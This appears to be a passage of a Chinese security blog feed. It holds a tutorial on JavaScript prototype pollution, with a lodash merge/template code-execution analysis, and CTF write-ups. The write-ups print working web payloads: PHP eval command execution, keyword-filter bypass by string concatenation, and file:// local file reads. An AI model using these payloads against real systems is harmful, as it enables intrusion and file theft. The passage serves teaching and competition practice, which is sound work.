    <content type="html"><![CDATA[<h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a>深入理解 JavaScript Prototype 污染攻击</h1><h2 id="1、prototype和-proto-分别是什么？"><a href="#1、prototype和-proto-分别是什么？" class="headerlink" title="1、prototype和__proto__分别是什么？"></a>1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">    this.show = function() &#123;</span><br><span class="line">        console.log(this.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Foo()).show()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = function show() &#123;</span><br><span class="line">    console.log(this.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let foo = new Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="#0x02-JavaScript原型链继承" class="headerlink" title="0x02 JavaScript原型链继承"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Father() &#123;</span><br><span class="line">    this.first_name = &#x27;Donald&#x27;</span><br><span class="line">    this.last_name = &#x27;Trump&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.first_name = &#x27;Melania&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = new Father()</span><br><span class="line"></span><br><span class="line">let son = new Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="#0x03-原型链污染是什么" class="headerlink" title="0x03 原型链污染是什么"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// foo是一个简单的JavaScript对象</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar 此时为1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 修改foo的原型（即Object）</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// 此时再用Object创建一个空的zoo对象</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// 查看zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="#0x04-哪些情况下原型链会被污染？" class="headerlink" title="0x04 哪些情况下原型链会被污染？"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="#0x05-Code-Breaking-2018-Thejs-分析" class="headerlink" title="0x05 Code-Breaking 2018 Thejs 分析"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; </span><br><span class="line">// define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(&#x27;index&#x27;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Use a sourceURL for easier debugging.</span><br><span class="line">var sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\n&#x27; : &#x27;&#x27;;</span><br><span class="line">// ...</span><br><span class="line">var result = attempt(function() &#123;</span><br><span class="line">  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
    
    
    <summary type="html">🥧深入理解 JavaScript Prototype 污染攻击</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>第八届强网杯青少赛wp</title>
    <link href="https://m3x1.cn/posts/2cd096fe.html"/>
    <id>https://m3x1.cn/posts/2cd096fe.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-07T10:47:00.564Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第八届强网杯青少赛wp"><a href="#第八届强网杯青少赛wp" class="headerlink" title="第八届强网杯青少赛wp"></a>第八届强网杯青少赛wp</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="签到漫画"><a href="#签到漫画" class="headerlink" title="签到漫画"></a>签到漫画</h4><blockquote><p>每个漫画的最后一张都是二维码的一部分，全部保存，然后拼在一起，扫描二维码出flag.。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic"><a href="#whitepic" class="headerlink" title="whitepic"></a>whitepic</h4><blockquote><p>考点：gif图像</p><p>下载文件，没有后缀名，能用010editor打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>根据文件头GIF89a，可以看出是个gif文件。直接使用gifsplitter分离帧数，在其中一帧找到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h4><blockquote><p>你懂的</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="ezGetFlag"><a href="#ezGetFlag" class="headerlink" title="ezGetFlag"></a>ezGetFlag</h4><blockquote><p>考点：http请求方式</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>点击10次会出现提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>直接抓包，修改请求方式，把GET改成POST就行了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell"><a href="#ezFindShell" class="headerlink" title="ezFindShell"></a>ezFindShell</h4><blockquote><p>考点：代码审计</p></blockquote><p>这题是赛后复现，所以可能不全</p><p>首先拿到一堆php文件，用seay审计</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>非常相似，当时比赛没找到漏洞，现在复现，全局搜索一下post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>发现可用漏洞</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>将代码进行base64编码传上去应该就可利用该漏洞。</p>]]></content>
    
    
    <summary type="html">🥧第八届强网杯青少赛wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hubu新星杯实践能力赛模拟赛web-wp</title>
    <link href="https://m3x1.cn/posts/98034dd5.html"/>
    <id>https://m3x1.cn/posts/98034dd5.html</id>
    <published>2024-11-22T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:20.567Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ez-eval"><a href="#ez-eval" class="headerlink" title="ez_eval"></a>ez_eval</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$hubu = $_GET[&#x27;hubu&#x27;];</span><br><span class="line"></span><br><span class="line">eval($hubu);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>先进行代码审计，GET传参hubu，并执行命令，没有任何绕过，放开手脚去做</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=system(&#x27;cat /f*&#x27;);      #直接rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1"><a href="#rce-level1" class="headerlink" title="rce_level1"></a>rce_level1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c  = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现过滤了关键字flag,system,php。</p><p>使用拼接绕过构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(ls);    #发现目录下没有flag文件</span><br><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(cat /f*);   #发现回显空白</span><br></pre></td></tr></table></figure><blockquote><p>不在文件夹里，那可能是在phpinfo里</p><p>payload：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>没回显…根据代码的过滤可以知道，应该只过滤了三个关键字，可其实并不只过滤了这三个关键字。</p><p>经过测试，发现有隐藏过滤，比如关键字php，和一些字符如反斜杠\</p><p>最后的payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;ph&#x27;.&#x27;pinfo&#x27;)();</span><br></pre></td></tr></table></figure><blockquote><p>在页面中找到flag。</p></blockquote><h4 id="ez-LFI"><a href="#ez-LFI" class="headerlink" title="ez_LFI"></a>ez_LFI</h4><blockquote><p>考点：伪协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>先随便传一个，/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>代码审计，根据网上查询的parse_url()函数的资料显示：</p><p>解析 URL，返回其组成部分，如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>所以必须在传入的url参数中让[host]是localhost。</p><p>然后再用file协议读取flag。</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file://localhost/flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Cute-Rabbit"><a href="#Cute-Rabbit" class="headerlink" title="Cute Rabbit"></a>Cute Rabbit</h4><blockquote><p>考点：rabbit编码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMS91RnhkczF5SU1jdit1K3o0NzFCcDR2aXcrVkNNaS9TU1QyZU5EMFUvSQo=</span><br></pre></td></tr></table></figure><blockquote><p>签到题，根据题目提示，是rabbit编码，密文末尾的=表示可能是base64，所以是</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic"><a href="#Docker-Forensic" class="headerlink" title="Docker Forensic"></a>Docker Forensic</h4><blockquote><p>考点：docker的使用</p><p>根据题目提示，先拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>将镜像压缩到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>将文件解压到一个目录下，然后切换到该目录。在该目录下有个sha256文件夹，把里面的文件解压</p><p>在tmp中找到password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>退级，在解压后的一个文件夹里找到flag.txt</p></blockquote><p><img 